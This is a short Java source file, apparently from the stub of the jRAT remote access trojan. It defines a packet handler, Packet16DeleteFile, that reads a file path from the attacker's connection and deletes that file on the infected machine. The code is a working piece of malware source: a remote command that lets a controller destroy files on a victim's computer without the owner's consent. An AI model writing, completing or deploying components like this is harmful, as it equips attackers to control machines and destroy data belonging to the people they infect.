package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.stub.Connection;


public class Packet16DeleteFile extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String file = Connection.instance.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}

	}

}
